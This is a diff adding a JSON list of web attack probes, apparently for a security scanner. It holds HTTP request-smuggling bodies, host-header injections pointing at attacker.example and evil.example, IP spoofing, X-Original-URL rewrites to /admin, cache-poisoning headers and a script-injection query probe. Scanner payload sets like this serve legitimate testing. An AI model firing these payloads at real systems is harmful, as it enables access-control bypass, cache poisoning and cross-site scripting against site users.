@@ -1,0 +1,115 @@
+[
+  {
+    "name": "CL.TE basic",
+    "class": "request-smuggling",
+    "description": "Content-Length + Transfer-Encoding: chunked. Frontend uses CL, backend uses TE. If responses diverge on the second request, the front/back disagreement is confirmed.",
+    "headers": {
+      "Content-Length": "13",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\r\n\r\nSMUGGLED"
+  },
+  {
+    "name": "TE.CL basic",
+    "class": "request-smuggling",
+    "description": "Transfer-Encoding: chunked + Content-Length. Frontend uses TE, backend uses CL. Same disagreement in the opposite direction.",
+    "headers": {
+      "Content-Length": "3",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "8\r\nSMUGGLED\r\n0\r\n\r\n"
+  },
+  {
+    "name": "TE obfuscation space",
+    "class": "request-smuggling",
+    "description": "Transfer-Encoding with trailing space — parsed by one side, not the other.",
+    "headers": {
+      "Content-Length": "6",
+      "Transfer-Encoding ": "chunked"
+    },
+    "body": "0\r\n\r\nX"
+  },
+  {
+    "name": "TE obfuscation tab",
+    "class": "request-smuggling",
+    "description": "Transfer-Encoding with tab character after header name.",
+    "headers": {
+      "Content-Length": "6",
+      "Transfer-Encoding\t": "chunked"
+    },
+    "body": "0\r\n\r\nX"
+  },
+  {
+    "name": "TE duplicate header",
+    "class": "request-smuggling",
+    "description": "Two Transfer-Encoding headers; order-dependent parsing.",
+    "headers": {
+      "Content-Length": "6",
+      "Transfer-Encoding": "chunked, identity"
+    },
+    "body": "0\r\n\r\nX"
+  },
+  {
+    "name": "Host header injection",
+    "class": "host-header",
+    "description": "Replace Host with attacker-controlled value. Watch for password-reset links / absolute redirects that include the injected host.",
+    "headers": {
+      "Host": "attacker.example"
+    },
+    "body": ""
+  },
+  {
+    "name": "X-Forwarded-Host",
+    "class": "host-header",
+    "description": "Many frameworks trust X-Forwarded-Host over Host for URL generation.",
+    "headers": {
+      "X-Forwarded-Host": "attacker.example"
+    },
+    "body": ""
+  },
+  {
+    "name": "X-Forwarded-For spoof",
+    "class": "host-header",
+    "description": "Spoof originating IP — sometimes used by IP allow-lists for admin panels.",
+    "headers": {
+      "X-Forwarded-For": "127.0.0.1"
+    },
+    "body": ""
+  },
+  {
+    "name": "X-Original-URL rewrite",
+    "class": "host-header",
+    "description": "Some reverse proxies rewrite the request path based on X-Original-URL, bypassing frontend auth.",
+    "headers": {
+      "X-Original-URL": "/admin"
+    },
+    "body": ""
+  },
+  {
+    "name": "X-Rewrite-URL rewrite",
+    "class": "host-header",
+    "description": "Same class as X-Original-URL, different header name (used by some WAFs).",
+    "headers": {
+      "X-Rewrite-URL": "/admin"
+    },
+    "body": ""
+  },
+  {
+    "name": "Cache poisoning via Host",
+    "class": "cache-poisoning",
+    "description": "Host header rewritten to attacker-controlled domain; cache may store the poisoned response and serve it to legitimate users.",
+    "headers": {
+      "Host": "evil.example",
+      "X-Forwarded-Host": "evil.example"
+    },
+    "body": ""
+  },
+  {
+    "name": "Cache-key confusion",
+    "class": "cache-poisoning",
+    "description": "Unkeyed query parameter — if backend reflects `utm_source` into the page body but the cache ignores it, a poisoned response can be stored.",
+    "headers": {},
+    "body": "",
+    "query_probe": "utm_source=<script>alert(1)</script>"
+  }
+]
